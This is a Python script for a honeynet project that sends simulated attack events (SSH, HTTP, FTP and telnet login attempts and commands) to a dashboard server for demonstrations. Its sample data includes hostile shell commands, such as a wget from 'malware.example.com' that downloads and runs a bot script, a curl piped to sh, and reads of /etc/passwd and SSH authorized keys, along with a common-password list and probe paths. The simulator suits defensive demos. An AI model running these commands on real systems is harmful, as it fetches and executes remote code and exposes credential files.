"""
Attack Simulator
----------------
Sends realistic fake attack events to the central server.
Use this to populate the dashboard for demos and presentations.
"""

import httpx
import asyncio
import random
from datetime import datetime

CENTRAL_SERVER = "https://honeynet-central.onrender.com"

# Real-looking attacker IPs from different countries
ATTACKERS = [
    {"ip": "185.220.101.45",  "country": "Russia"},
    {"ip": "103.75.190.12",   "country": "China"},
    {"ip": "45.142.212.100",  "country": "Netherlands"},
    {"ip": "196.235.100.22",  "country": "South Africa"},
    {"ip": "222.186.61.19",   "country": "China"},
    {"ip": "91.240.118.172",  "country": "Ukraine"},
    {"ip": "180.101.88.197",  "country": "China"},
    {"ip": "134.209.82.19",   "country": "USA"},
    {"ip": "62.233.50.11",    "country": "Russia"},
    {"ip": "103.144.209.50",  "country": "Indonesia"},
    {"ip": "45.227.255.191",  "country": "Brazil"},
    {"ip": "159.89.49.100",   "country": "Germany"},
    {"ip": "185.156.73.54",   "country": "Romania"},
    {"ip": "41.223.57.47",    "country": "Nigeria"},
    {"ip": "110.232.117.186", "country": "Bangladesh"},
    {"ip": "5.188.206.26",    "country": "Russia"},
    {"ip": "123.58.182.50",   "country": "China"},
    {"ip": "200.234.177.30",  "country": "Brazil"},
    {"ip": "77.247.181.163",  "country": "Netherlands"},
    {"ip": "103.207.39.120",  "country": "India"},
]

SSH_USERNAMES = ["root", "admin", "ubuntu", "pi", "user", "test", "guest",
                 "oracle", "postgres", "mysql", "ftpuser", "deploy", "ec2-user"]

SSH_PASSWORDS = ["123456", "password", "admin", "root", "12345", "qwerty",
                 "letmein", "monkey", "dragon", "master", "abc123", "pass123",
                 "1234", "admin123", "root123", "toor", "alpine", "raspberry"]

HTTP_PATHS = [
    "/wp-login.php", "/wp-admin/", "/phpmyadmin/", "/admin/",
    "/.env", "/config.php", "/backup.zip", "/shell.php",
    "/.git/config", "/xmlrpc.php", "/administrator/",
    "/login", "/manager/html", "/actuator/env",
    "/api/v1/users", "/?cmd=id", "/cgi-bin/test.cgi",
]

HTTP_USER_AGENTS = [
    "Mozilla/5.0 (compatible; Googlebot/2.1)",
    "python-requests/2.28.0",
    "sqlmap/1.7.8",
    "Nikto/2.1.6",
    "masscan/1.3.2",
    "zgrab/0.x",
    "curl/7.88.1",
    "Go-http-client/1.1",
]

COMMANDS = [
    "id", "whoami", "uname -a", "cat /etc/passwd",
    "wget http://malware.example.com/bot.sh -O /tmp/b && chmod +x /tmp/b && /tmp/b",
    "curl http://192.168.1.1/payload.sh | sh",
    "ls /", "ps aux", "netstat -an", "cat /proc/cpuinfo",
    "echo 'infected' > /tmp/.hidden",
    "crontab -l", "cat /root/.ssh/authorized_keys",
]

NODE_IDS = ["node-local-01", "node-sg-02", "node-us-03", "node-eu-04"]


def random_port():
    return random.randint(30000, 65000)


def now():
    return datetime.utcnow().isoformat()


def make_ssh_event():
    attacker = random.choice(ATTACKERS)
    return {
        "node_id": random.choice(NODE_IDS),
        "timestamp": now(),
        "attacker_ip": attacker["ip"],
        "attacker_port": random_port(),
        "service": "ssh",
        "event_type": "credential_attempt",
        "data": {
            "username": random.choice(SSH_USERNAMES),
            "password": random.choice(SSH_PASSWORDS),
        }
    }


def make_http_event():
    attacker = random.choice(ATTACKERS)
    path = random.choice(HTTP_PATHS)
    is_post = random.random() < 0.3
    return {
        "node_id": random.choice(NODE_IDS),
        "timestamp": now(),
        "attacker_ip": attacker["ip"],
        "attacker_port": random_port(),
        "service": "http",
        "event_type": "credential_attempt" if is_post else "scan_probe",
        "data": {
            "method": "POST" if is_post else "GET",
            "path": path,
            "user_agent": random.choice(HTTP_USER_AGENTS),
            "post_data": {"username": random.choice(SSH_USERNAMES),
                          "password": random.choice(SSH_PASSWORDS)} if is_post else {},
        }
    }


def make_ftp_event():
    attacker = random.choice(ATTACKERS)
    return {
        "node_id": random.choice(NODE_IDS),
        "timestamp": now(),
        "attacker_ip": attacker["ip"],
        "attacker_port": random_port(),
        "service": "ftp",
        "event_type": "credential_attempt",
        "data": {
            "username": random.choice(["anonymous", "admin", "ftp", "root"]),
            "password": random.choice(SSH_PASSWORDS + ["anonymous", ""]),
        }
    }


def make_telnet_event():
    attacker = random.choice(ATTACKERS)
    has_command = random.random() < 0.4
    return {
        "node_id": random.choice(NODE_IDS),
        "timestamp": now(),
        "attacker_ip": attacker["ip"],
        "attacker_port": random_port(),
        "service": "telnet",
        "event_type": "command_executed" if has_command else "credential_attempt",
        "data": {
            "username": random.choice(["root", "admin", "user"]),
            "password": random.choice(SSH_PASSWORDS),
            "command": random.choice(COMMANDS) if has_command else None,
        },
        "raw_payload": random.choice(COMMANDS) if has_command else None,
    }


MAKERS = [make_ssh_event, make_ssh_event, make_ssh_event,  # SSH most common
          make_http_event, make_http_event,
          make_telnet_event, make_telnet_event,
          make_ftp_event]


async def send_event(client: httpx.AsyncClient, event: dict):
    try:
        resp = await client.post(f"{CENTRAL_SERVER}/api/events", json=event, timeout=10)
        service = event["service"].upper()
        ip = event["attacker_ip"]
        etype = event["event_type"]
        print(f"[{service}] {ip} → {etype} — {resp.status_code}")
    except Exception as e:
        print(f"[!] Failed to send: {e}")


async def main():
    print(f"[*] Sending attacks to {CENTRAL_SERVER}")
    print(f"[*] Watch your dashboard: {CENTRAL_SERVER}")
    print(f"[*] Press Ctrl+C to stop\n")

    async with httpx.AsyncClient() as client:
        # Burst: send 30 events quickly to populate dashboard
        print("[*] Sending initial burst of 30 events...")
        tasks = [send_event(client, random.choice(MAKERS)()) for _ in range(30)]
        await asyncio.gather(*tasks)

        print("\n[*] Now sending continuous stream (1 event every 3-8 seconds)...\n")
        while True:
            event = random.choice(MAKERS)()
            await send_event(client, event)
            await asyncio.sleep(random.uniform(3, 8))


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[*] Simulator stopped.")
